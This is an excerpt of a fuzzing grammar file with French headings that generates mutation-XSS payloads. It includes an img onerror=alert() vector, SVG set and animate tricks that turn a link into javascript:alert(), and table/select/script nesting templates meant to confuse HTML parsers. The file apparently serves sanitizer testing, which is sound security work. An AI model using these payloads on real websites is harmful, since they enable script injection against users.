...
# Fusion de mxss.txt et mxss_without_known_bugs.txt
...
<xss_exec> = <lt>svg viewBox="0 0 160 40" xmlns="http://www.w3.org/2000/svg"<gt><lt>a href="https://developer.mozilla.org/"<gt><lt>set attributeName="href" to="javascript:alert()" /<gt><lt>text x="10" y="25"<gt>click<lt>/text<gt><lt>/a<gt><lt>/svg<gt>

### alert() classique avec img
<xss_exec_attr> = <lt>img src=x onerror=alert()<gt>

### avec svg et set
<xss_exec_attr> = <lt>svg viewBox='0 0 160 40' xmlns='http://www.w3.org/2000/svg'<gt><lt>a href='https://developer.mozilla.org/'<gt><lt>set attributeName='href' to='javascript:alert()' /<gt><lt>text x='10' y='25'<gt>click<lt>/text<gt><lt>/a<gt><lt>/svg<gt>

### avec svg et animate
<xss_exec_attr> = <lt>svg viewBox='0 0 160 40' xmlns='http://www.w3.org/2000/svg'<gt><lt>a href='https://developer.mozilla.org/'<gt><lt>animate attributeName='href' to='javascript:alert()' begin='0s' dur='1s' fill='freeze' /<gt><lt>text x='10' y='25'<gt>click<lt>/text<gt><lt>/a<gt><lt>/svg<gt>
...
<mxss_foster> = <lt>table<gt><mxss_foreign_confusion><lt>table<gt><mxss_foreign_confusion><lt>select<gt><mxss_foreign_confusion><lt>select<gt><lt>script<gt><mxss_foreign_confusion><lt>table<gt>
<mxss_foster> = <lt>table<gt><mxss_payload><lt>table<gt><mxss_payload><lt>select<gt><mxss_payload><lt>select<gt><lt>script<gt><mxss_payload><lt>table<gt>
...
<mxss_payload nonrecursive=true p=0.5> = <lt>a<gt>SAFE FALLBACK AFTER TOO LONG RECURSION<lt>/a<gt>
